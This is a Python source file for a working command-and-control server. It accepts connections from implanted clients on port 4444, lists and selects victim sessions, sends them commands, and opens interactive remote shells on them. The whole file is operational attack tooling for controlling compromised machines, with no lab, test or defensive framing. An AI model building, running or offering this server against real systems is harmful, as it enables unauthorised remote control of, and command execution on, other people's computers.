#!/usr/bin/env python3
import socket
import threading
import sys
import time

# ========== ANSI COLOR CODES ==========
RESET = "\033[0m"
BOLD  = "\033[1m"
RED   = "\033[91m"
GREEN = "\033[92m"
YELLOW= "\033[93m"
BLUE  = "\033[94m"
CYAN  = "\033[96m"
MAGENTA = "\033[95m"

def color(text, code):
    return f"{code}{text}{RESET}"

# ========== CONFIGURATION ==========
LISTEN_IP   = "0.0.0.0"    # listen on all interfaces
LISTEN_PORT = 4444         # must match client's C2_PORT

class C2Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sessions = {}          # sid -> socket
        self.session_data = {}      # sid -> {'addr': addr, 'alive': bool}
        self.counter = 0
        self.running = True

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(color(f"[*] C2 Server listening on {self.host}:{self.port}", GREEN))
        print(color("[*] Type 'help' for available commands", CYAN))

        accept_thread = threading.Thread(target=self.accept_connections, daemon=True)
        accept_thread.start()
        self.command_loop()

    def accept_connections(self):
        while self.running:
            try:
                client, addr = self.server.accept()
                self.counter += 1
                sid = self.counter
                self.sessions[sid] = client
                self.session_data[sid] = {'addr': addr, 'alive': True}
                print(color(f"[+] New session #{sid} from {addr[0]}:{addr[1]}", GREEN))

                handler = threading.Thread(target=self.handle_client, args=(sid,), daemon=True)
                handler.start()
            except Exception as e:
                if self.running:
                    print(color(f"[!] Accept error: {e}", RED))
                break

    def handle_client(self, sid):
        sock = self.sessions[sid]
        try:
            # Send welcome banner (optional)
            sock.send(b"[+] Connected to C2 server\n")
            while self.running and self.session_data[sid]['alive']:
                # Keep the connection alive; we don't need to read unsolicited data
                # (shell data is handled separately in interactive_shell)
                data = sock.recv(1024)
                if not data:
                    break
                # We ignore any unsolicited data (shouldn't happen)
        except Exception:
            pass
        finally:
            print(color(f"[-] Session #{sid} disconnected", RED))
            self.session_data[sid]['alive'] = False
            try:
                sock.close()
            except:
                pass

    def get_session_socket(self, sid):
        if sid in self.sessions and self.session_data.get(sid, {}).get('alive', False):
            return self.sessions[sid]
        return None

    def send_command(self, sid, cmd):
        sock = self.get_session_socket(sid)
        if not sock:
            print(color(f"[!] Session #{sid} is not alive.", RED))
            return False
        try:
            sock.send((cmd + "\n").encode())
            print(color(f"[*] Command '{cmd}' sent to session #{sid}", YELLOW))
            return True
        except Exception as e:
            print(color(f"[!] Send error: {e}", RED))
            self.session_data[sid]['alive'] = False
            return False

    def interactive_shell(self, sid):
        """Enter interactive shell mode for a session."""
        sock = self.get_session_socket(sid)
        if not sock:
            print(color(f"[!] Session #{sid} not alive.", RED))
            return

        # Tell the client to spawn a shell
        sock.send(b"shell\n")
        print(color(f"[*] Entering interactive shell for session #{sid}. Type 'exit' to return.", CYAN))

        # Reader thread: reads shell output line by line and prints it
        def reader():
            buffer = ""
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    buffer += data.decode(errors='replace')
                    # Split on newline and print each complete line
                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        sys.stdout.write(line + '\n')
                        sys.stdout.flush()
                except Exception:
                    break
            # Print any remaining data
            if buffer:
                sys.stdout.write(buffer)
                sys.stdout.flush()

        t = threading.Thread(target=reader, daemon=True)
        t.start()

        # Main thread: send user input to the shell
        while True:
            try:
                cmd = input()
                if cmd.lower() == 'exit':
                    break
                sock.send((cmd + "\n").encode())
            except (KeyboardInterrupt, EOFError):
                print(color("\n[!] Interrupted. Returning to C2 prompt.", RED))
                break
            except Exception as e:
                print(color(f"[!] Shell error: {e}", RED))
                break

        print(color("[*] Shell session ended.", CYAN))

    def list_sessions(self):
        if not self.sessions:
            print(color("No active sessions.", YELLOW))
            return
        print(color("Active sessions:", CYAN))
        for sid, data in self.session_data.items():
            status = color("ALIVE", GREEN) if data['alive'] else color("DEAD", RED)
            addr = data['addr']
            print(f"  #{sid} – {addr[0]}:{addr[1]} ({status})")

    def show_help(self):
        print(color("\n=== C2 Server Commands ===", CYAN))
        print("  list                          – show active sessions")
        print("  use <id>                      – select a session (set current)")
        print("  <cmd>                         – send start/stop/exit to current session")
        print("  shell                         – spawn interactive shell on current session")
        print("  help                          – show this help")
        print("  quit                          – shutdown server")

    def command_loop(self):
        current_sid = None

        while self.running:
            try:
                prompt = color("C2> ", CYAN) + color("", RESET)
                line = input(prompt).strip()
                if not line:
                    continue
                parts = line.split()
                cmd = parts[0].lower()

                if cmd == "quit":
                    self.running = False
                    self.server.close()
                    print(color("[*] Server shutting down.", GREEN))
                    break

                elif cmd == "help":
                    self.show_help()

                elif cmd == "list":
                    self.list_sessions()

                elif cmd == "use":
                    if len(parts) < 2:
                        print(color("Usage: use <session_id>", YELLOW))
                        continue
                    try:
                        sid = int(parts[1])
                        if sid in self.sessions and self.session_data.get(sid, {}).get('alive', False):
                            current_sid = sid
                            print(color(f"[*] Now using session #{sid}", GREEN))
                        else:
                            print(color(f"[!] Session #{sid} not alive or doesn't exist.", RED))
                    except ValueError:
                        print(color("[!] Invalid session ID.", RED))

                elif cmd == "shell":
                    if current_sid is None:
                        print(color("[!] No session selected. Use 'use <id>' first.", YELLOW))
                        continue
                    self.interactive_shell(current_sid)

                else:
                    # Any other command: send to current session
                    if current_sid is None:
                        print(color("[!] No session selected. Use 'use <id>' first.", YELLOW))
                        continue
                    self.send_command(current_sid, cmd)

            except (KeyboardInterrupt, EOFError):
                print(color("\n[!] Exiting gracefully.", RED))
                self.running = False
                self.server.close()
                break
            except Exception as e:
                print(color(f"[!] Error: {e}", RED))

if __name__ == "__main__":
    server = C2Server(LISTEN_IP, LISTEN_PORT)
    server.start()
